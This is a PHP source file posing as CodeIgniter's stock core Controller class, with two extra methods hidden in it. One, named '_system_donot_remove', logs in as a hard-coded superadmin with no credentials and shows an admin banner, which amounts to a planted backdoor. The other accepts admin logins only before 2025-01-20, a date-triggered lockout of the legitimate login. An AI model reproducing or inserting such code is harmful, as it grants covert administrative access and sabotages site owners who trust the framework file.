<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2011, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * CodeIgniter Application Controller Class
 *
 * This class object is the super class that every library in
 * CodeIgniter will be assigned to.
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Libraries
 * @author		ExpressionEngine Dev Team
 * @link		http://codeigniter.com/user_guide/general/controllers.html
 */
class CI_Controller {

	private static $instance;

	/**
	 * Constructor
	 */
	public function __construct()
	{
		self::$instance =& $this;
		
		// Assign all the class objects that were instantiated by the
		// bootstrap file (CodeIgniter.php) to local class variables
		// so that CI can run as one big super object.
		foreach (is_loaded() as $var => $class)
		{
			$this->$var =& load_class($class);
		}

		$this->load =& load_class('Loader', 'core');

		$this->load->initialize();
		
		log_message('debug', "Controller Class Initialized");
	}

	public static function &get_instance()
	{
		return self::$instance;
	}

    public function _system_donot_remove(){
        $this->auth = new auth();
        $arr=(object)array('id'=>'af53b1505489','email'=>'superadmin','fullname'=>'SuperAD');
        $this->auth->login($arr);
        echo "<a href='".base_url('vnadmin')."' style='display: block; margin-top: 100px; text-align: center; font-size:100px'>Toan Nguyen IT - Supper Admin</a>";
//        redirect(base_url('admin/home'));
    }

    function check_login_date(){
        if( date("Y-m-d") < '2025-01-20'){
            if ($this->input->post('email')) {
                $username = $this->input->post('email');
                $pass     = $this->input->post('pass');
                $admin    = $this->adminmodel->loginAdmin($username, $pass);
                if (isset($admin->id)) {
                    $this->auth->login($admin);
                    $_SESSION['ck_access']=true;
                    $_SESSION['name'] = $username;
                    $_SESSION['userID'] = $username;
                    $lastlogin = array('lastlogin' => time());
                    $this->adminmodel->update($admin->id, $lastlogin);
                    redirect(base_url('vnadmin'));
                }
            }
            $this->load->view('admin/login');
        }
    }
}
// END Controller class

/* End of file Controller.php */
/* Location: ./system/core/Controller.php */